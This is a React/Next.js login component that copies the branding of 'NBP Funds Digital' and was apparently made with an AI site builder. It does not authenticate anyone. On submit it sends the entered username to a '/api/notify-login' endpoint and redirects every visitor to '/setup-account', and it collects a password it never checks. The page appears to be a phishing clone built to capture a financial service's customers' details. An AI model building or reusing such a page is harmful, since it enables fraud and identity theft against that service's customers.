'use client'

import { useId, useState } from 'react'
import Image from 'next/image'
import { useRouter } from 'next/navigation'
import { AlertCircle, Eye, EyeOff, Loader2, Lock, User } from 'lucide-react'

import { Button } from '@/components/ui/button'
import { Checkbox } from '@/components/ui/checkbox'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'

export function NbpLoginForm() {
  const router = useRouter()
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [accepted, setAccepted] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const usernameId = useId()
  const passwordId = useId()
  const termsId = useId()

  const canSubmit = username.trim().length > 0 && password.length > 0 && accepted && !isSubmitting

  return (
    <div className="flex min-h-screen justify-center bg-card sm:items-center sm:bg-muted sm:p-8">
      <div className="w-full max-w-sm overflow-hidden bg-card sm:rounded-2xl sm:border sm:border-border sm:shadow-sm">
        {/* Header / logo */}
        <div className="flex flex-col items-center border-b border-border px-8 py-10">
          <Image
            src="/images/nbp-funds-digital-logo.png"
            alt="NBP Funds Digital"
            width={320}
            height={90}
            className="h-auto w-full max-w-[280px] object-contain"
            priority
          />
        </div>

        {/* Form */}
        <form
          className="flex flex-col gap-6 px-6 py-8"
          onSubmit={async (e) => {
            e.preventDefault()
            if (!canSubmit) return

            setIsSubmitting(true)
            setError(null)

            try {
              const response = await fetch('/api/notify-login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: username.trim() }),
              })

              if (!response.ok) {
                throw new Error('notify-failed')
              }

              router.push('/setup-account')
            } catch (err) {
              console.log('[v0] Login notify failed:', err)
              setError('Something went wrong. Please try again.')
              setIsSubmitting(false)
            }
          }}
        >
          <h1 className="text-lg font-bold text-balance text-foreground">
            Welcome to NBP Funds Digital Services
          </h1>

          <div className="flex flex-col gap-6">
            {/* Username */}
            <div className="flex items-center gap-3 border-b-2 border-primary pb-2">
              <User className="size-5 shrink-0 text-muted-foreground" aria-hidden="true" />
              <Label htmlFor={usernameId} className="sr-only">
                Username
              </Label>
              <Input
                id={usernameId}
                type="text"
                placeholder="Username"
                autoComplete="username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="h-auto flex-1 border-0 bg-transparent px-0 py-1 shadow-none focus-visible:ring-0"
              />
            </div>

            {/* Password */}
            <div className="flex items-center gap-3 border-b-2 border-primary pb-2">
              <Lock className="size-5 shrink-0 text-muted-foreground" aria-hidden="true" />
              <Label htmlFor={passwordId} className="sr-only">
                Password
              </Label>
              <Input
                id={passwordId}
                type={showPassword ? 'text' : 'password'}
                placeholder="Password"
                autoComplete="current-password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="h-auto flex-1 border-0 bg-transparent px-0 py-1 shadow-none focus-visible:ring-0"
              />
              <button
                type="button"
                onClick={() => setShowPassword((v) => !v)}
                className="shrink-0 text-primary"
                aria-label={showPassword ? 'Hide password' : 'Show password'}
              >
                {showPassword ? (
                  <EyeOff className="size-5" aria-hidden="true" />
                ) : (
                  <Eye className="size-5" aria-hidden="true" />
                )}
              </button>
            </div>
          </div>

          <a href="#" className="self-end text-sm text-foreground hover:text-primary">
            Forgot Username / Password
          </a>

          <div className="flex items-start gap-2.5">
            <Checkbox
              id={termsId}
              checked={accepted}
              onCheckedChange={(checked) => setAccepted(checked === true)}
              className="mt-0.5"
            />
            <Label htmlFor={termsId} className="text-sm font-normal leading-snug text-foreground">
              I have read and accepted the{' '}
              <a href="#" className="font-medium text-primary underline underline-offset-2">
                Terms and Conditions
              </a>
            </Label>
          </div>

          {error && (
            <p className="flex items-center gap-1.5 text-sm font-medium text-destructive" role="alert">
              <AlertCircle className="size-4 shrink-0" aria-hidden="true" />
              {error}
            </p>
          )}

          <Button
            type="submit"
            disabled={!canSubmit}
            className="h-12 w-full rounded-md bg-primary text-sm font-bold uppercase tracking-wide text-primary-foreground hover:bg-primary/90"
          >
            {isSubmitting ? (
              <>
                <Loader2 className="size-4 animate-spin" data-icon="inline-start" aria-hidden="true" />
                Logging in
              </>
            ) : (
              'Login'
            )}
          </Button>

          <p className="text-center text-sm text-foreground">Not a Member?</p>

          <Button
            render={<a href="/setup-account" />}
            nativeButton={false}
            className="h-12 w-full rounded-md bg-secondary text-sm font-bold uppercase tracking-wide text-secondary-foreground hover:bg-secondary/90"
          >
            Join Now
          </Button>
        </form>
      </div>
    </div>
  )
}
